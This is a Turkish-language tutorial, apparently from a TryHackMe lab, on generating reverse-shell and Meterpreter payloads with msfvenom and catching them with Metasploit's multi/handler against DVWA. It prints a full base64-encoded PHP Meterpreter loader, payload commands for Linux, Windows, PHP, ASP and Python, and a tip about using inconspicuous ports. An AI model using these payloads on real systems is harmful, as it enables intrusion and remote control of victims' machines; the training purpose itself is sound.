#

Msfpayload ve Msfencode'un yerini alan **Msfvenom**, payload (zararlı yazılım yükü) oluşturmanıza olanak tanır.

Msfvenom, Metasploit framework'ünde bulunan tüm payload'lara erişmenize imkan sağlar. Msfvenom; birçok farklı formatta (PHP, exe, dll, elf vb.) ve birçok farklı hedef sistem için (Apple, Windows, Android, Linux vb.) payload oluşturmanıza izin verir.

**Msfvenom Payloads**

Bash

```
root@ip-10-10-186-44:~# msfvenom -l payloads Framework Payloads (562 total) [--payload ]
==================================================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Bağlantı için dinler ve bir komut satırı açar
    aix/ppc/shell_find_port                             Kurulu bir bağlantı üzerinde shell açar
    aix/ppc/shell_interact                              Sadece execve /bin/sh çalıştırır (inetd programları için)
    aix/ppc/shell_reverse_tcp                           Saldırgana geri bağlanır ve bir komut satırı açar
    android/meterpreter/reverse_http                    Android'de bir meterpreter sunucusu çalıştırır. İletişimi HTTP üzerinden tüneller
    android/meterpreter/reverse_https                   Android'de bir meterpreter sunucusu çalıştırır. İletişimi HTTPS üzerinden tüneller
    android/meterpreter/reverse_tcp                     Android'de bir meterpreter sunucusu çalıştırır. Geri bağlantı aşamalandırıcısı (stager)
...
```

### Çıktı Formatları (Output Formats)

İster tek başına çalışan payload'lar (örneğin Meterpreter için bir Windows yürütülebilir dosyası) oluşturabilir, isterseniz de kullanılabilir ham (raw) bir format (örneğin python) alabilirsiniz. Desteklenen çıktı formatlarını listelemek için `msfvenom --list formats` komutu kullanılabilir.

### Kodlayıcılar (Encoders)

Bazı inanışların aksine, kodlayıcılar hedef sistemde yüklü olan antivirüsü atlatmayı amaçlamazlar. Adından da anlaşılacağı gibi, payload'u kodlarlar. Bazı antivirüs yazılımlarına karşı etkili olabilse de, sorunu çözmek için modern gizleme (obfuscation) tekniklerini kullanmak veya shellcode enjekte etme yöntemlerini öğrenmek daha iyi bir çözümdür. Aşağıdaki örnek, kodlamanın (`-e` parametresi ile) kullanımını göstermektedir. Meterpreter'ın PHP sürümü Base64 ile kodlanmış ve çıktı formatı `raw` olarak ayarlanmıştır.

**Bir PHP Payload Oluşturma**

Bash

```
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
root@ip-10-10-186-44:~#
```

### Dinleyiciler (Handlers)

Reverse shell kullanan exploit'lere benzer şekilde, MSFvenom payload'u tarafından oluşturulan gelen bağlantıları kabul edebilmeniz gerekecektir. Bir exploit modülü kullanırken, bu kısım exploit modülü tarafından otomatik olarak halledilir; bir reverse shell ayarlarken "payload options" başlığının nasıl göründüğünü hatırlayacaksınız. Bir hedeften bağlantı almak için yaygın olarak kullanılan terim "shell yakalamak"tır (catching a shell). MSFvenom payload'unuzda oluşturulan reverse shell'ler veya Meterpreter geri çağırmaları (callbacks), bir **handler** kullanılarak kolayca yakalanabilir.

Aşağıdaki senaryo tanıdık gelebilir; DVWA'da (Damn Vulnerable Web Application) bulunan dosya yükleme zafiyetini istismar edeceğiz. Bu görevdeki alıştırmalar için başka bir hedef sistemde benzer bir senaryoyu tekrarlamanız gerekecektir; DVWA burada illüstrasyon amaçlı kullanılmıştır. Exploit adımları şunlardır:

1. MSFvenom kullanarak PHP shell oluşturun.
    
2. Metasploit handler'ı başlatın.
    
3. PHP shell'i çalıştırın.
    

MSFvenom bir payload, yerel makine IP adresi ve payload'un bağlanacağı yerel portu gerektirecektir. Aşağıda görüldüğü gibi, 10.0.2.19 saldırıda kullanılan AttackBox'ın IP adresidir ve yerel port olarak 7777 seçilmiştir.

**PHP Reverse Shell Oluşturma**

Bash

```
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3020 bytes
root@ip-10-0-2-19:~#
```

**Lütfen dikkat:** Çıktı PHP dosyası, aşağıda görüldüğü gibi yorum satırı yapılmış başlangıç PHP etiketini ve bitiş etiketini (`?>`) kaçıracaktır. `reverse_shell.php` dosyası, çalışan bir PHP dosyasına dönüştürülmek üzere düzenlenmelidir. Dosyanın başındaki yorumlar kaldırılmalı ve sonuna bitiş etiketi eklenmelidir.

Gelen bağlantıyı almak için **Multi Handler** kullanacağız. Modül, `use exploit/multi/handler` komutuyla kullanılabilir. Multi handler tüm Metasploit payload'larını destekler ve normal shell'lerin yanı sıra Meterpreter için de kullanılabilir. Modülü kullanmak için payload değerini (bu durumda `php/reverse_php`), LHOST ve LPORT değerlerini ayarlamamız gerekecektir.

**Dinleyiciyi (Listener) Ayarlama**

Bash

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):
...
Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.19        yes       Dinleme adresi
   LPORT  7777             yes       Dinleme portu
...
msf6 exploit(multi/handler) >
```

Her şey ayarlandıktan sonra, handler'ı çalıştıracağız (`run`) ve gelen bağlantıyı bekleyeceğiz.

**Reverse Shell Bekleme**

Bash

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.186.44:7777
```

Reverse shell tetiklendiğinde, bağlantı `multi/handler` tarafından alınacak ve bize bir shell sağlayacaktır. Eğer payload Meterpreter olarak ayarlanmış olsaydı (örneğin bir Windows yürütülebilir formatında), `multi/handler` bize bir Meterpreter shell sağlayacaktı.

### Diğer Payload'lar

Hedef sistemin yapılandırmasına bağlı olarak (işletim sistemi, kurulu web sunucusu, kurulu yorumlayıcı vb.), MSFvenom hemen hemen tüm formatlarda payload oluşturmak için kullanılabilir. Aşağıda sıklıkla kullanacağınız birkaç örnek verilmiştir. Tüm bu örneklerde LHOST saldıran makinenizin IP adresi, LPORT ise handler'ınızın dinleyeceği port olacaktır.

- **Linux Executable (elf):** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` .elf formatı Windows'taki .exe formatı ile karşılaştırılabilir. Bunlar Linux için yürütülebilir dosyalardır. Ancak, hedef makinede yürütme izinlerine sahip olduklarından emin olmanız gerekebilir; örneğin `chmod +x rev_shell.elf` komutuyla izin verip `./rev_shell.elf` ile çalıştırabilirsiniz.
    
- **Windows:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
    
- **PHP:** `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
    
- **ASP:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
    
- **Python:** `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
    

Yukarıdaki örneklerin tümü **reverse** (ters) payload'lardır. Bu, çalışması için saldıran makinenizde bir handler olarak `exploit/multi/handler` modülünün dinliyor olması gerektiği anlamına gelir. Handler'ı, MSFvenom payload'unu oluştururken kullandığınız aynı payload, LHOST ve LPORT parametreleriyle kurmanız gerekecektir.

---

### 🛡️ Siber Güvenlik ve CTF İpucu

- **Bağlantı Sorunları**: Eğer bağlantı gelmiyorsa, `LHOST` kısmına yanlışlıkla makinenin kendi IP'sini değil, her zaman TryHackMe VPN IP'ni (tun0) yazdığından emin ol.
    
- **Port Tercihi**: Bazı sistemler 4444 gibi portları kısıtlayabilir; 80, 443 veya 53 gibi daha az dikkat çeken portları denemek bağlantı şansını artırabilir.